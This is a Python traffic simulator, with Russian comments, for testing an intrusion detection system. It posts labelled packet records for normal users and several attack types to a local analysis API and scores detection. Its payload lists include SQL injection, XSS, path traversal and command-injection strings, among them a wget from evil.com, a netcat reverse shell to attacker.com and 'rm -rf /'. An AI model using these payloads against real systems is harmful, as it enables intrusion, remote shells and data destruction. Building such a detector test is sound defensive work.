#!/usr/bin/env python3
"""
Realistic Traffic Simulator
===========================

Симулирует реалистичный сетевой трафик со смешанными паттернами:
- Нормальные пользователи (80%)
- Атаки различных типов (20%)

Позволяет оценить:
- True Positive Rate (обнаружение атак)
- False Positive Rate (ложные срабатывания на нормальный трафик)
- Precision, Recall, F1-Score

Использование:
    python3 realistic_traffic.py --duration 300 --attack-ratio 0.2
    python3 realistic_traffic.py -t 192.168.100.1 -d 120 --attack-ratio 0.15
"""

import argparse
import requests
import time
import random
import string
import json
import threading
from datetime import datetime
from dataclasses import dataclass, field
from typing import List, Dict
from collections import defaultdict


@dataclass
class TrafficStats:
    """Статистика генерации трафика"""
    total_packets: int = 0
    normal_packets: int = 0
    attack_packets: int = 0
    
    # По типам атак
    attack_types: Dict[str, int] = field(default_factory=lambda: defaultdict(int))
    
    # По пользователям
    normal_users: set = field(default_factory=set)
    attackers: set = field(default_factory=set)
    
    start_time: float = 0
    end_time: float = 0


class RealisticTrafficGenerator:
    """Генератор реалистичного трафика"""
    
    def __init__(self, target_host: str, target_port: int, behavioral_api: str):
        self.target_host = target_host
        self.target_port = target_port
        self.behavioral_api = behavioral_api
        self.stats = TrafficStats()
        self.running = True
        
        # Пулы IP-адресов
        self.normal_user_ips = [f"10.0.{random.randint(1,10)}.{i}" for i in range(1, 51)]
        self.attacker_ips = [f"192.168.50.{i}" for i in range(1, 11)]
        
        # Типичные страницы для нормального трафика
        self.normal_pages = [
            "/", "/index.html", "/about", "/contact", "/products",
            "/api/health", "/api/status", "/login", "/register",
            "/images/logo.png", "/css/style.css", "/js/app.js"
        ]
        
        # Типичные User-Agent'ы
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
            "Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0",
        ]
    
    def generate_normal_packet(self, src_ip: str = None) -> Dict:
        """Генерация нормального пакета (имитация обычного пользователя)"""
        if src_ip is None:
            src_ip = random.choice(self.normal_user_ips)
        
        self.stats.normal_users.add(src_ip)
        
        page = random.choice(self.normal_pages)
        user_agent = random.choice(self.user_agents)
        
        payload = f"GET {page} HTTP/1.1\r\nHost: {self.target_host}\r\nUser-Agent: {user_agent}\r\n\r\n"
        
        return {
            "timestamp": time.time(),
            "src_ip": src_ip,
            "dst_ip": self.target_host,
            "src_port": random.randint(49152, 65535),
            "dst_port": random.choice([80, 443, self.target_port]),
            "protocol": "TCP",
            "size": len(payload) + random.randint(40, 100),
            "tcp_flags": 24,  # PSH+ACK (нормальный HTTP)
            "payload": payload,
            "label": "normal"
        }
    
    def generate_sqli_attack(self, src_ip: str = None) -> Dict:
        """SQL Injection атака"""
        if src_ip is None:
            src_ip = random.choice(self.attacker_ips)
        
        self.stats.attackers.add(src_ip)
        self.stats.attack_types["sqli"] += 1
        
        sqli_payloads = [
            "' OR '1'='1",
            "' UNION SELECT username, password FROM users--",
            "1; DROP TABLE users--",
            "' OR 1=1--",
            "admin'--",
            "1' AND '1'='1",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "1 OR 1=1",
            "' OR ''='",
            "1'; EXEC xp_cmdshell('dir')--",
        ]
        
        payload = random.choice(sqli_payloads)
        page = random.choice(["/login", "/search", "/api/users", "/products"])
        full_payload = f"GET {page}?id={payload} HTTP/1.1\r\nHost: {self.target_host}\r\n\r\n"
        
        return {
            "timestamp": time.time(),
            "src_ip": src_ip,
            "dst_ip": self.target_host,
            "src_port": random.randint(49152, 65535),
            "dst_port": self.target_port,
            "protocol": "TCP",
            "size": len(full_payload) + 40,
            "tcp_flags": 24,
            "payload": full_payload,
            "label": "sqli"
        }
    
    def generate_xss_attack(self, src_ip: str = None) -> Dict:
        """XSS атака"""
        if src_ip is None:
            src_ip = random.choice(self.attacker_ips)
        
        self.stats.attackers.add(src_ip)
        self.stats.attack_types["xss"] += 1
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(document.cookie)",
            "<body onload=alert(1)>",
            "\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<iframe src='javascript:alert(1)'>",
            "<input onfocus=alert(1) autofocus>",
        ]
        
        payload = random.choice(xss_payloads)
        page = random.choice(["/search", "/comment", "/feedback", "/profile"])
        full_payload = f"GET {page}?q={payload} HTTP/1.1\r\nHost: {self.target_host}\r\n\r\n"
        
        return {
            "timestamp": time.time(),
            "src_ip": src_ip,
            "dst_ip": self.target_host,
            "src_port": random.randint(49152, 65535),
            "dst_port": self.target_port,
            "protocol": "TCP",
            "size": len(full_payload) + 40,
            "tcp_flags": 24,
            "payload": full_payload,
            "label": "xss"
        }
    
    def generate_port_scan(self, src_ip: str = None, num_ports: int = 20) -> List[Dict]:
        """Port Scan атака (возвращает несколько пакетов)"""
        if src_ip is None:
            src_ip = random.choice(self.attacker_ips)
        
        self.stats.attackers.add(src_ip)
        self.stats.attack_types["port_scan"] += num_ports
        
        packets = []
        ports = random.sample(range(1, 1024), min(num_ports, 100))
        
        for port in ports:
            packets.append({
                "timestamp": time.time(),
                "src_ip": src_ip,
                "dst_ip": self.target_host,
                "src_port": random.randint(49152, 65535),
                "dst_port": port,
                "protocol": "TCP",
                "size": 64,
                "tcp_flags": 2,  # SYN only
                "payload": "",
                "label": "port_scan"
            })
        
        return packets
    
    def generate_syn_flood(self, src_ip: str = None, num_packets: int = 50) -> List[Dict]:
        """SYN Flood атака"""
        if src_ip is None:
            src_ip = random.choice(self.attacker_ips)
        
        self.stats.attackers.add(src_ip)
        self.stats.attack_types["syn_flood"] += num_packets
        
        packets = []
        for _ in range(num_packets):
            packets.append({
                "timestamp": time.time(),
                "src_ip": src_ip,
                "dst_ip": self.target_host,
                "src_port": random.randint(1024, 65535),
                "dst_port": self.target_port,
                "protocol": "TCP",
                "size": 64,
                "tcp_flags": 2,  # SYN
                "payload": "",
                "label": "syn_flood"
            })
        
        return packets
    
    def generate_host_scan(self, src_ip: str = None, num_hosts: int = 20) -> List[Dict]:
        """Host Scan (горизонтальное сканирование)"""
        if src_ip is None:
            src_ip = random.choice(self.attacker_ips)
        
        self.stats.attackers.add(src_ip)
        self.stats.attack_types["host_scan"] += num_hosts
        
        packets = []
        for i in range(num_hosts):
            dst_ip = f"192.168.100.{random.randint(1, 254)}"
            packets.append({
                "timestamp": time.time(),
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "src_port": random.randint(49152, 65535),
                "dst_port": 22,  # SSH
                "protocol": "TCP",
                "size": 64,
                "tcp_flags": 2,  # SYN
                "payload": "",
                "label": "host_scan"
            })
        
        return packets
    
    def generate_command_injection(self, src_ip: str = None) -> Dict:
        """Command Injection атака"""
        if src_ip is None:
            src_ip = random.choice(self.attacker_ips)
        
        self.stats.attackers.add(src_ip)
        self.stats.attack_types["cmd_injection"] += 1
        
        cmd_payloads = [
            "; cat /etc/passwd",
            "| ls -la",
            "&& rm -rf /",
            "; wget http://evil.com/shell.sh",
            "| nc -e /bin/sh attacker.com 4444",
            "; id",
            "$(whoami)",
            "`uname -a`",
        ]
        
        payload = random.choice(cmd_payloads)
        page = random.choice(["/ping", "/exec", "/run", "/api/system"])
        full_payload = f"GET {page}?cmd=test{payload} HTTP/1.1\r\nHost: {self.target_host}\r\n\r\n"
        
        return {
            "timestamp": time.time(),
            "src_ip": src_ip,
            "dst_ip": self.target_host,
            "src_port": random.randint(49152, 65535),
            "dst_port": self.target_port,
            "protocol": "TCP",
            "size": len(full_payload) + 40,
            "tcp_flags": 24,
            "payload": full_payload,
            "label": "cmd_injection"
        }
    
    def generate_path_traversal(self, src_ip: str = None) -> Dict:
        """Path Traversal атака"""
        if src_ip is None:
            src_ip = random.choice(self.attacker_ips)
        
        self.stats.attackers.add(src_ip)
        self.stats.attack_types["path_traversal"] += 1
        
        traversal_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "/etc/passwd%00",
            "....\\....\\....\\windows\\system32\\config\\sam",
        ]
        
        payload = random.choice(traversal_payloads)
        full_payload = f"GET /files/{payload} HTTP/1.1\r\nHost: {self.target_host}\r\n\r\n"
        
        return {
            "timestamp": time.time(),
            "src_ip": src_ip,
            "dst_ip": self.target_host,
            "src_port": random.randint(49152, 65535),
            "dst_port": self.target_port,
            "protocol": "TCP",
            "size": len(full_payload) + 40,
            "tcp_flags": 24,
            "payload": full_payload,
            "label": "path_traversal"
        }
    
    def send_packet(self, packet: Dict) -> bool:
        """Отправка пакета в Behavioral API"""
        try:
            # Убираем label перед отправкой (он только для статистики)
            packet_copy = {k: v for k, v in packet.items() if k != "label"}
            requests.post(
                f"{self.behavioral_api}/api/packet",
                json=packet_copy,
                timeout=1
            )
            return True
        except:
            return False
    
    def run_simulation(self, duration: int, attack_ratio: float = 0.2, 
                       packets_per_second: float = 10.0):
        """
        Запуск симуляции трафика
        
        Args:
            duration: Длительность в секундах
            attack_ratio: Доля атак (0.0 - 1.0)
            packets_per_second: Средняя скорость генерации
        """
        print("=" * 60)
        print("REALISTIC TRAFFIC SIMULATION")
        print("=" * 60)
        print(f"Target:          {self.target_host}:{self.target_port}")
        print(f"Behavioral API:  {self.behavioral_api}")
        print(f"Duration:        {duration} seconds")
        print(f"Attack ratio:    {attack_ratio * 100:.1f}%")
        print(f"Packets/sec:     {packets_per_second}")
        print("=" * 60)
        print()
        
        self.stats.start_time = time.time()
        end_time = self.stats.start_time + duration
        
        # Счётчики для отслеживания
        labels_sent = defaultdict(int)
        interval = 1.0 / packets_per_second
        
        attack_types = ["sqli", "xss", "port_scan", "syn_flood", 
                        "host_scan", "cmd_injection", "path_traversal"]
        
        while time.time() < end_time and self.running:
            # Решаем: атака или нормальный трафик
            if random.random() < attack_ratio:
                # Генерируем атаку
                attack_type = random.choice(attack_types)
                
                if attack_type == "sqli":
                    packet = self.generate_sqli_attack()
                    self.send_packet(packet)
                    labels_sent[packet["label"]] += 1
                    self.stats.attack_packets += 1
                    
                elif attack_type == "xss":
                    packet = self.generate_xss_attack()
                    self.send_packet(packet)
                    labels_sent[packet["label"]] += 1
                    self.stats.attack_packets += 1
                    
                elif attack_type == "port_scan":
                    packets = self.generate_port_scan(num_ports=random.randint(10, 30))
                    for p in packets:
                        self.send_packet(p)
                        labels_sent[p["label"]] += 1
                        self.stats.attack_packets += 1
                    
                elif attack_type == "syn_flood":
                    packets = self.generate_syn_flood(num_packets=random.randint(20, 50))
                    for p in packets:
                        self.send_packet(p)
                        labels_sent[p["label"]] += 1
                        self.stats.attack_packets += 1
                    
                elif attack_type == "host_scan":
                    packets = self.generate_host_scan(num_hosts=random.randint(10, 25))
                    for p in packets:
                        self.send_packet(p)
                        labels_sent[p["label"]] += 1
                        self.stats.attack_packets += 1
                    
                elif attack_type == "cmd_injection":
                    packet = self.generate_command_injection()
                    self.send_packet(packet)
                    labels_sent[packet["label"]] += 1
                    self.stats.attack_packets += 1
                    
                elif attack_type == "path_traversal":
                    packet = self.generate_path_traversal()
                    self.send_packet(packet)
                    labels_sent[packet["label"]] += 1
                    self.stats.attack_packets += 1
            
            else:
                # Нормальный трафик
                packet = self.generate_normal_packet()
                self.send_packet(packet)
                labels_sent[packet["label"]] += 1
                self.stats.normal_packets += 1
            
            self.stats.total_packets += 1
            
            # Прогресс
            if self.stats.total_packets % 100 == 0:
                elapsed = time.time() - self.stats.start_time
                remaining = duration - elapsed
                pps = self.stats.total_packets / max(elapsed, 1)
                print(f"\r[{elapsed:5.0f}s] Packets: {self.stats.total_packets:6d} | "
                      f"Normal: {self.stats.normal_packets:5d} | "
                      f"Attacks: {self.stats.attack_packets:5d} | "
                      f"PPS: {pps:5.1f} | "
                      f"Remaining: {remaining:4.0f}s", end="", flush=True)
            
            # Случайная задержка для реалистичности
            time.sleep(interval * random.uniform(0.5, 1.5))
        
        self.stats.end_time = time.time()
        print("\n")
        
        return labels_sent
    
    def analyze_results(self) -> Dict:
        """Анализ результатов симуляции через Behavioral API"""
        print("=" * 60)
        print("ANALYZING RESULTS")
        print("=" * 60)
        
        results = {
            "normal_users": {},
            "attackers": {},
            "summary": {}
        }
        
        # Анализ нормальных пользователей
        print("\nНормальные пользователи:")
        print("-" * 40)
        
        false_positives = 0
        true_negatives = 0
        
        for ip in list(self.stats.normal_users)[:10]:  # Первые 10
            try:
                response = requests.post(
                    f"{self.behavioral_api}/api/analyze",
                    json={"src_ip": ip},
                    timeout=5
                )
                data = response.json()
                
                score = data.get("final_score", 0)
                is_threat = data.get("is_threat", False)
                level = data.get("threat_level", "unknown")
                
                results["normal_users"][ip] = {
                    "score": score,
                    "is_threat": is_threat,
                    "level": level
                }
                
                if is_threat:
                    false_positives += 1
                    status = "❌ FP"
                else:
                    true_negatives += 1
                    status = "✅ OK"
                
                print(f"  {ip:<18} Score: {score:.3f}  Level: {level:<10} {status}")
                
            except Exception as e:
                print(f"  {ip:<18} Error: {e}")
        
        # Анализ атакующих
        print("\nАтакующие IP:")
        print("-" * 40)
        
        true_positives = 0
        false_negatives = 0
        
        for ip in self.stats.attackers:
            try:
                response = requests.post(
                    f"{self.behavioral_api}/api/analyze",
                    json={"src_ip": ip},
                    timeout=5
                )
                data = response.json()
                
                score = data.get("final_score", 0)
                is_threat = data.get("is_threat", False)
                level = data.get("threat_level", "unknown")
                
                results["attackers"][ip] = {
                    "score": score,
                    "is_threat": is_threat,
                    "level": level
                }
                
                if is_threat:
                    true_positives += 1
                    status = "✅ Detected"
                else:
                    false_negatives += 1
                    status = "❌ Missed"
                
                print(f"  {ip:<18} Score: {score:.3f}  Level: {level:<10} {status}")
                
            except Exception as e:
                print(f"  {ip:<18} Error: {e}")
        
        # Расчёт метрик
        print("\n" + "=" * 60)
        print("METRICS")
        print("=" * 60)
        
        total_normal = true_negatives + false_positives
        total_attacks = true_positives + false_negatives
        
        # Избегаем деления на ноль
        if total_attacks > 0:
            tpr = true_positives / total_attacks  # Recall / Sensitivity
        else:
            tpr = 0
        
        if total_normal > 0:
            fpr = false_positives / total_normal
            tnr = true_negatives / total_normal  # Specificity
        else:
            fpr = 0
            tnr = 0
        
        if true_positives + false_positives > 0:
            precision = true_positives / (true_positives + false_positives)
        else:
            precision = 0
        
        if precision + tpr > 0:
            f1 = 2 * (precision * tpr) / (precision + tpr)
        else:
            f1 = 0
        
        accuracy = (true_positives + true_negatives) / max(total_normal + total_attacks, 1)
        
        results["summary"] = {
            "true_positives": true_positives,
            "true_negatives": true_negatives,
            "false_positives": false_positives,
            "false_negatives": false_negatives,
            "tpr_recall": round(tpr, 4),
            "fpr": round(fpr, 4),
            "precision": round(precision, 4),
            "f1_score": round(f1, 4),
            "accuracy": round(accuracy, 4),
        }
        
        print(f"True Positives (TP):   {true_positives}")
        print(f"True Negatives (TN):   {true_negatives}")
        print(f"False Positives (FP):  {false_positives}")
        print(f"False Negatives (FN):  {false_negatives}")
        print()
        print(f"TPR (Recall):          {tpr:.2%}")
        print(f"FPR:                   {fpr:.2%}")
        print(f"Precision:             {precision:.2%}")
        print(f"F1-Score:              {f1:.4f}")
        print(f"Accuracy:              {accuracy:.2%}")
        
        return results
    
    def print_summary(self, labels_sent: Dict):
        """Вывод итогов симуляции"""
        duration = self.stats.end_time - self.stats.start_time
        
        print("=" * 60)
        print("SIMULATION SUMMARY")
        print("=" * 60)
        print(f"Duration:           {duration:.1f} seconds")
        print(f"Total packets:      {self.stats.total_packets}")
        print(f"Normal packets:     {self.stats.normal_packets} ({self.stats.normal_packets/self.stats.total_packets*100:.1f}%)")
        print(f"Attack packets:     {self.stats.attack_packets} ({self.stats.attack_packets/self.stats.total_packets*100:.1f}%)")
        print(f"Packets/sec:        {self.stats.total_packets/duration:.1f}")
        print()
        print(f"Normal users:       {len(self.stats.normal_users)}")
        print(f"Attackers:          {len(self.stats.attackers)}")
        print()
        print("Attack types:")
        for attack_type, count in sorted(self.stats.attack_types.items()):
            print(f"  {attack_type:<20} {count:6d}")
        print()
        print("Labels sent:")
        for label, count in sorted(labels_sent.items()):
            print(f"  {label:<20} {count:6d}")


def main():
    parser = argparse.ArgumentParser(
        description="Realistic Traffic Simulator for IDS Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 realistic_traffic.py -d 120 --attack-ratio 0.2
  python3 realistic_traffic.py -t 192.168.100.1 -d 300 --pps 20
  python3 realistic_traffic.py --behavioral http://localhost:8081 -d 60
        """
    )
    
    parser.add_argument("-t", "--target", default="192.168.100.1",
                        help="Target host IP (default: 192.168.100.1)")
    parser.add_argument("-p", "--port", type=int, default=8080,
                        help="Target port (default: 8080)")
    parser.add_argument("-d", "--duration", type=int, default=120,
                        help="Duration in seconds (default: 120)")
    parser.add_argument("--attack-ratio", type=float, default=0.2,
                        help="Ratio of attacks (0.0-1.0, default: 0.2)")
    parser.add_argument("--pps", type=float, default=10.0,
                        help="Packets per second (default: 10)")
    parser.add_argument("--behavioral", default="http://localhost:8081",
                        help="Behavioral API URL (default: http://localhost:8081)")
    parser.add_argument("--output", "-o", default="realistic_test_results.json",
                        help="Output file for results (default: realistic_test_results.json)")
    
    args = parser.parse_args()
    
    # Создание генератора
    generator = RealisticTrafficGenerator(
        target_host=args.target,
        target_port=args.port,
        behavioral_api=args.behavioral
    )
    
    try:
        # Запуск симуляции
        labels_sent = generator.run_simulation(
            duration=args.duration,
            attack_ratio=args.attack_ratio,
            packets_per_second=args.pps
        )
        
        # Вывод итогов
        generator.print_summary(labels_sent)
        
        # Анализ результатов
        results = generator.analyze_results()
        
        # Добавление информации о симуляции
        results["simulation"] = {
            "timestamp": datetime.now().isoformat(),
            "duration": args.duration,
            "attack_ratio": args.attack_ratio,
            "pps": args.pps,
            "total_packets": generator.stats.total_packets,
            "normal_packets": generator.stats.normal_packets,
            "attack_packets": generator.stats.attack_packets,
            "attack_types": dict(generator.stats.attack_types),
        }
        
        # Сохранение результатов
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        
        print(f"\nРезультаты сохранены в: {args.output}")
        
    except KeyboardInterrupt:
        print("\n\nПрервано пользователем")
        generator.running = False


if __name__ == "__main__":
    main()
